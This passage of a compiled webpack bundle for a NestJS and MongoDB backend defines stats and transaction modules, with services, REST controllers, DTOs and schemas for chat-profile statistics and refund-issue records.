var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Service = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let Stat2Service = class Stat2Service {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.Stat2Service = Stat2Service;
exports.Stat2Service = Stat2Service = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("Stats2Module")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], Stat2Service);


/***/ }),

/***/ "./src/components/stats2/update-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/update-stat2.dto.ts ***!
  \***************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat2_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/stats/create-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/create-stat.dto.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats/stat.controller.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/stat.controller.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
const update_stat_dto_1 = __webpack_require__(/*! ./update-stat.dto */ "./src/components/stats/update-stat.dto.ts");
let StatController = class StatController {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.StatController = StatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteAll", null);
exports.StatController = StatController = __decorate([
    (0, swagger_1.ApiTags)('stats'),
    (0, common_1.Controller)('stats'),
    __metadata("design:paramtypes", [stat_service_1.StatService])
], StatController);


/***/ }),

/***/ "./src/components/stats/stat.module.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.module.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const stat_controller_1 = __webpack_require__(/*! ./stat.controller */ "./src/components/stats/stat.controller.ts");
const stat_schema_1 = __webpack_require__(/*! ./stat.schema */ "./src/components/stats/stat.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let StatModule = class StatModule {
};
exports.StatModule = StatModule;
exports.StatModule = StatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: "StatsModule", collection: "stats", schema: stat_schema_1.StatSchema }])
        ],
        controllers: [stat_controller_1.StatController],
        providers: [stat_service_1.StatService],
        exports: [stat_service_1.StatService]
    })
], StatModule);


/***/ }),

/***/ "./src/components/stats/stat.schema.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.schema.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat = class Stat {
};
exports.Stat = Stat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "profile", void 0);
exports.Stat = Stat = __decorate([
    (0, mongoose_1.Schema)()
], Stat);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats/stat.service.ts":
/*!**********************************************!*\
  !*** ./src/components/stats/stat.service.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let StatService = class StatService {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.StatService = StatService;
exports.StatService = StatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("StatsModule")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], StatService);


/***/ }),

/***/ "./src/components/stats/update-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/update-stat.dto.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/transactions/dto/create-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/create-transaction.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateTransactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateTransactionDto {
}
exports.CreateTransactionDto = CreateTransactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Unique transaction ID (UTR).' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Amount involved in the transaction.' }),
    __metadata("design:type", Number)
], CreateTransactionDto.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Issue type reported by the user.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Description of issue reported by the user.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Refund method selected by the user.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User profile ID.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User chat ID.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'IP address of the user.' }),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "ip", void 0);


/***/ }),

/***/ "./src/components/transactions/dto/update-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/update-transaction.dto.ts ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateTransactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
class UpdateTransactionDto extends (0, swagger_1.PartialType)(create_transaction_dto_1.CreateTransactionDto) {
}
exports.UpdateTransactionDto = UpdateTransactionDto;


/***/ }),

/***/ "./src/components/transactions/schemas/transaction.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/schemas/transaction.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionSchema = exports.Transaction = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let Transaction = class Transaction extends mongoose_2.Document {
};
exports.Transaction = Transaction;
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "transactionId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Number)
], Transaction.prototype, "amount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "issue", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "description", void 0);
__decorate([
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], Transaction.prototype, "refundMethod", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "profile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], Transaction.prototype, "ipAddress", void 0);
exports.Transaction = Transaction = __decorate([
    (0, mongoose_1.Schema)({ timestamps: true })
], Transaction);
exports.TransactionSchema = mongoose_1.SchemaFactory.createForClass(Transaction);


/***/ }),

/***/ "./src/components/transactions/transaction.controller.ts":
/*!***************************************************************!*\
  !*** ./src/components/transactions/transaction.controller.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
const update_transaction_dto_1 = __webpack_require__(/*! ./dto/update-transaction.dto */ "./src/components/transactions/dto/update-transaction.dto.ts");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
let TransactionController = class TransactionController {
    constructor(transactionService) {
        this.transactionService = transactionService;
    }
    async create(createTransactionDto) {
        return this.transactionService.create(createTransactionDto);
    }
    async findOne(id) {
        return this.transactionService.findOne(id);
    }
    async findAll(search, limit, offset) {
        return this.transactionService.findAll(search, limit, offset);
    }
    async update(id, updateTransactionDto) {
        return this.transactionService.update(id, updateTransactionDto);
    }
    async delete(id) {
        return this.transactionService.delete(id);
    }
};
exports.TransactionController = TransactionController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new transaction' }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'Transaction created successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_transaction_dto_1.CreateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':id'),
    (0, swagger_1.ApiOperation)({ summary: 'Get transaction by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Transaction retrieved successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Transaction not found.' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all transactions or search transactions' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Transactions retrieved successfully.' }),
    __param(0, (0, common_1.Query)('search')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findAll", null);
__decorate([
    (0, common_1.Put)(':id'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a transaction by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Transaction updated successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Transaction not found.' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_transaction_dto_1.UpdateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':id'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a transaction by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Transaction deleted successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Transaction not found.' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "delete", null);
exports.TransactionController = TransactionController = __decorate([
    (0, swagger_1.ApiTags)('Transactions'),
    (0, common_1.Controller)('transactions'),
    __metadata("design:paramtypes", [transaction_service_1.TransactionService])
], TransactionController);


/***/ }),

/***/ "./src/components/transactions/transaction.module.ts":
/*!***********************************************************!*\
  !*** ./src/components/transactions/transaction.module.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_controller_1 = __webpack_require__(/*! ./transaction.controller */ "./src/components/transactions/transaction.controller.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
let TransactionModule = class TransactionModule {
};
exports.TransactionModule = TransactionModule;
exports.TransactionModule = TransactionModule = __decorate([
    (0, common_1.Module)({
        imports: [
